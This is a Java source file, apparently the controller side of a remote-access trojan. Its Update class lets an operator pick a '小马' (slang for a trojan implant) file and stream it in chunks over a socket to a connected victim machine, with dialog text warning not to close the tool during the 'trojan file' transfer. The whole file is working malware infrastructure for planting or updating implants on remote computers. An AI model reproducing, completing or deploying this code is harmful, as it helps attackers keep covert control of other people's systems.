package me.server.utils;

import javax.swing.*;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;

public class Update {
    public static void UpLoad( Socket socket) throws Exception {
        JFileChooser dlg = new JFileChooser();
        int filelen = 8 * 1024;
        byte[] bytes;
        dlg.setDialogTitle("选择小马文件");
        dlg.setFileSelectionMode(JFileChooser.FILES_ONLY);
        int result = dlg.showOpenDialog(null);
        if (result == JFileChooser.APPROVE_OPTION) {
            JOptionPane.showMessageDialog(null,"正在发送小马文件,请勿关闭软件,请等待传输成功!","警告",JOptionPane.WARNING_MESSAGE);
            File file = dlg.getSelectedFile();
            SendMessage.SendHead(MessageFlags.UPDATE,socket);
            FileInputStream fileInputStream = new FileInputStream(file);
            if(file.length() < filelen) {
                bytes = new byte[(int)file.length()];
                fileInputStream.read(bytes);
                SendMessage.SendHead(MessageFlags.UPDATE_PREPARE,socket);
                SendMessage.Send(MessageFlags.UPDATE_FILE,bytes,socket);
                SendMessage.Send(MessageFlags.UPDATE_FILE_END,file.getName().getBytes(),socket);
                fileInputStream.close();
            }else {
                SendMessage.SendHead(MessageFlags.UPDATE_PREPARE,socket);
                int len = (int) (file.length()/filelen);
                int len1 = (int) (file.length()%filelen);
                for(;len > 0;len--) {
                    bytes = new byte[filelen];
                    fileInputStream.read(bytes);
                    SendMessage.Send(MessageFlags.UPDATE_FILE,bytes,socket);
                }
                bytes = new byte[len1];
                fileInputStream.read(bytes);
                SendMessage.Send(MessageFlags.UPDATE_FILE,bytes,socket);
                SendMessage.Send(MessageFlags.UPDATE_FILE_END,file.getName().getBytes(),socket);
                fileInputStream.close();
            }
        }
    }
}
